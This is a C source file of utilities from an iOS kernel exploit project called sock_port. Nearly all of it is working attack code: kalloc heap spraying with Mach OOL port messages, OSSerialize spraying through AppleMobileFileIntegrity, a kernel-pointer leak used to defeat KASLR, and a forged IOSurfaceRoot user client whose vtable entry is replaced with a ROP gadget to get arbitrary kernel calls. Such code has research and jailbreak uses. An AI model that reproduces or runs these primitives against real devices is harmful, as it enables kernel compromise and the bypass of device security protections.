//
//  exploit_utilities.c
//  sock_port
//
//  Created by Jake James on 7/17/19.
//  Copyright Â© 2019 Jake James. All rights reserved.
//

#include "exploit_utilities.h"
#include "IOKit/iokitUser.c"       // io_service_open_extended and yes .c
//have these here or else it'll complain about dup symbols bla bla bla

// from Ian Beer. make a kernel allocation with the kernel address of 'target_port', 'count' times
mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int count, int disposition) {
    mach_port_t q = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
    if (err != KERN_SUCCESS) {
        printf("[-] failed to allocate port\n");
        return 0;
    }
    
    mach_port_t* ports = malloc(sizeof(mach_port_t) * count);
    for (int i = 0; i < count; i++) {
        ports[i] = target_port;
    }
    
    struct ool_msg* msg = (struct ool_msg*)calloc(1, sizeof(struct ool_msg));
    
    msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_size = (mach_msg_size_t)sizeof(struct ool_msg);
    msg->hdr.msgh_remote_port = q;
    msg->hdr.msgh_local_port = MACH_PORT_NULL;
    msg->hdr.msgh_id = 0x41414141;
    
    msg->body.msgh_descriptor_count = 1;
    
    msg->ool_ports.address = ports;
    msg->ool_ports.count = count;
    msg->ool_ports.deallocate = 0;
    msg->ool_ports.disposition = disposition;
    msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
    
    err = mach_msg(&msg->hdr,
                   MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                   msg->hdr.msgh_size,
                   0,
                   MACH_PORT_NULL,
                   MACH_MSG_TIMEOUT_NONE,
                   MACH_PORT_NULL);
    
    if (err != KERN_SUCCESS) {
        printf("[-] failed to send message: %s\n", mach_error_string(err));
        return MACH_PORT_NULL;
    }
    
    return q;
}

// Ian Beer
size_t message_size_for_kalloc_size(size_t kalloc_size) {
    return ((3 * kalloc_size) / 4) - 0x74;
}

// Ian Beer
mach_port_t send_kalloc_message(uint8_t *replacer_message_body, uint32_t replacer_body_size) {
    mach_port_t q = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
    if (err != KERN_SUCCESS) {
        printf("[-] failed to allocate port\n");
        return MACH_PORT_NULL;
    }
    
    mach_port_limits_t limits = {0};
    limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;
    err = mach_port_set_attributes(mach_task_self(),
                                   q,
                                   MACH_PORT_LIMITS_INFO,
                                   (mach_port_info_t)&limits,
                                   MACH_PORT_LIMITS_INFO_COUNT);
    if (err != KERN_SUCCESS) {
        printf("[-] failed to increase queue limit\n");
        return MACH_PORT_NULL;
    }
    
    mach_msg_size_t msg_size = sizeof(struct simple_msg) + replacer_body_size;
    struct simple_msg *msg = (struct simple_msg *)malloc(msg_size);
    memset(msg, 0, sizeof(struct simple_msg));
    memcpy(&msg->buf[0], replacer_message_body, replacer_body_size);
    
    for (int i = 0; i < 256; i++) {
        msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
        msg->hdr.msgh_size = msg_size;
        msg->hdr.msgh_remote_port = q;
        msg->hdr.msgh_local_port = MACH_PORT_NULL;
        msg->hdr.msgh_id = 0x41414142;
        
        err = mach_msg(&msg->hdr,
                       MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                       msg_size,
                       0,
                       MACH_PORT_NULL,
                       MACH_MSG_TIMEOUT_NONE,
                       MACH_PORT_NULL);
        
        if (err != KERN_SUCCESS) {
            printf("[-] failed to send message %x (%d): %s\n", err, i, mach_error_string(err));
            return MACH_PORT_NULL;
        }
    }
    
    return q;
}

io_service_t _io_get_service(void* servicename)
{
    io_service_t service = MACH_PORT_NULL;
    service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(servicename));
    if(!MACH_PORT_VALID(service))
    {
        printf("[-] Failed to get IO service handle (port = 0x%08x)\n", service);
        return -1;
    }
    return service;
}

mach_port_t _io_get_userclient(io_service_t svc)
{
    mach_port_t uc = MACH_PORT_NULL;
    printf("[i] Preparing userclient...\n");
    kern_return_t ret = IOServiceOpen(svc, mach_task_self(), 0, &uc);
    if(ret != KERN_SUCCESS)
    {
        printf("[-] Failed to prepare userclient! \n");
        return -1;
    }
    return uc;
}

io_connect_t _io_spawn_client(void *dict, size_t dictlen)
{
    //printf("[i] Spawning user client / Parsing dictionary...\n");
    io_connect_t client = MACH_PORT_NULL;
    kern_return_t err;
    kern_return_t ret = io_service_open_extended(_io_get_service("AppleMobileFileIntegrity"), mach_task_self(), 0, NDR_record, dict, dictlen, &err, &client);
    if(ret != KERN_SUCCESS || err != KERN_SUCCESS || !MACH_PORT_VALID(client))
    {
        printf("[-] Failed to parse dictionary (client = 0x%08x, ret = %u: %s, err = %u: %s)\n", client, ret, mach_error_string(ret), err, mach_error_string(err));
    }
    return client;
}

void spray_OSSerialize(void* data, size_t size)
{
    /* struct with the first element removed
     8 bytes misaligned
     somehow, this makes minmtu show up properly
     but pktinfo shouldn't be correct?
     check pktopts def for alignment */
    
    // 192 bytes array if you want to check where stuff goes
    // ip6_pktopts is 192 bytes on 64 bits, 136 on 32 bits
    // both go into kalloc.192
    
    // anyway, it is off 8 bytes, so add 8 bytes.
    int cnt = 0;
    int dict_sz = size + (6 * sizeof(uint32_t)) + 8/* haxx */;
    uint32_t* dictz = calloc(1, dict_sz);
    dictz[cnt++] = kOSSerializeMagic;
    dictz[cnt++] = kOSSerializeDictionary | kOSSerializeEndCollection | 0x2;
    dictz[cnt++] = kOSSerializeSymbol | 0x4;
    dictz[cnt++] = 0x00424242;
    dictz[cnt++] = kOSSerializeData | size | kOSSerializeEndCollection;
    dictz[cnt++] = 0x0; /* haxx */
    dictz[cnt++] = 0x0; /* haxx */
    memcpy(dictz + 5 + 2/* haxx */, data, size);
    
    _io_spawn_client(dictz, dict_sz);
    
    return;
}

uint64_t get_kernel_slide(void) {
    size_t anchor = 0;
    kern_return_t ret = KERN_FAILURE;
    ret = get_kernel_anchor(&anchor);
    if(ret != KERN_SUCCESS){
        printf("[-] Failed getting kernel anchor!\n");
        return 0;
    }
    uintptr_t kernel_base = (anchor & 0xfffffffffff00000) + 0x2000;
    for(uint32_t val = 0; 1; kernel_base -= 0x100000)
    {
        
        kread(kernel_base, &val, sizeof(val));
        if(val == MH_MAGIC_64)
        {
            break;
        }
    }
    printf("[i] Kernel Slide: 0x%lx\n", kernel_base - KERNEL_BASE_ADDRESS);
    return kernel_base - KERNEL_BASE_ADDRESS;
}

kern_return_t get_kernel_anchor(size_t *anchor)
{
    kern_return_t ret = KERN_FAILURE;
    io_connect_t client = MACH_PORT_NULL;
    io_iterator_t it = MACH_PORT_NULL;
    io_object_t o = MACH_PORT_NULL;
    
    io_service_t service = _io_get_service("AppleMobileFileIntegrity");
    
    const char xml[] = "<plist><dict><key>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</key><integer size=\"512\">1768515945</integer></dict></plist>";
    _io_spawn_client((char*)xml, sizeof(xml));
    IORegistryEntryGetChildIterator(service, "IOService", &it);
    
    bool found = false;
    while((o = IOIteratorNext(it)) != MACH_PORT_NULL && !found)
    {
        uintptr_t buf[16];
        uint32_t size = (uint32_t)sizeof(buf);
        ret = IORegistryEntryGetProperty(o, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", (char*)buf, &size);
        if(ret == KERN_SUCCESS)
        {
            *anchor = buf[1];
            found = true;
        }
        IOObjectRelease(o);
        o = MACH_PORT_NULL;
    }
    
out:;
    if(it != MACH_PORT_NULL)
    {
        IOObjectRelease(it);
    }
    if(client != MACH_PORT_NULL)
    {
        IOObjectRelease(client);
    }
    if(service != MACH_PORT_NULL)
    {
        IOObjectRelease(service);
    }
    return ret;
}


mach_port_t user_client;
uint64_t fake_client;

void init_kcall(uint64_t our_task_addr) {
    io_service_t service = _io_get_service("IOSurfaceRoot");
    user_client = _io_get_userclient(service);
    uint64_t uc_port = find_port(user_client, our_task_addr);
    printf("Found port: 0x%llx\n", uc_port);
    
    uint64_t uc_addr = rk64(uc_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)); // The UserClient itself (the C++ object) is at the kobject field
    printf("Found addr: 0x%llx\n", uc_addr);
    
    uint64_t uc_vtab = rk64(uc_addr); // vtables in C++ are at *object
    printf("Found vtab: 0x%llx\n", uc_vtab);
    
    uint64_t fake_vtable = kalloc(0x1000);
    printf("Created fake_vtable at %016llx\n", fake_vtable);
    
    for (int i = 0; i < 0x200; i++) {
        wk64(fake_vtable+i*8, rk64(uc_vtab+i*8));
    }
    
    printf("Copied some of the vtable over\n");
    
    // Create the fake user client
    fake_client = kalloc(0x1000);
    printf("Created fake_client at %016llx\n", fake_client);
    
    for (int i = 0; i < 0x200; i++) {
        wk64(fake_client+i*8, rk64(uc_addr+i*8));
    }
    
    printf("Copied the user client over\n");
    
    // Write our fake vtable into the fake user client
    wk64(fake_client, fake_vtable);
    
    // Replace the user client with ours
    wk64(uc_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), fake_client);
    
    // Now the userclient port we have will look into our fake user client rather than the old one
    
    // Replace IOUserClient::getExternalTrapForIndex with our ROP gadget (add x0, x0, #0x40; ret;)
    wk64(fake_vtable+8*0xB7, patchfinderaddress(PFIND_ADDR_ADD_X0_X0_0X40));
    
    printf("Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex\n");
    
    //pthread_mutex_init(&kexecute_lock, NULL);
}

uint64_t kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
    uint64_t offx20 = rk64(fake_client+0x40);
    uint64_t offx28 = rk64(fake_client+0x48);
    wk64(fake_client+0x40, x0);
    wk64(fake_client+0x48, addr);
    uint64_t returnval = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
    wk64(fake_client+0x40, offx20);
    wk64(fake_client+0x48, offx28);
    
    return returnval;
}
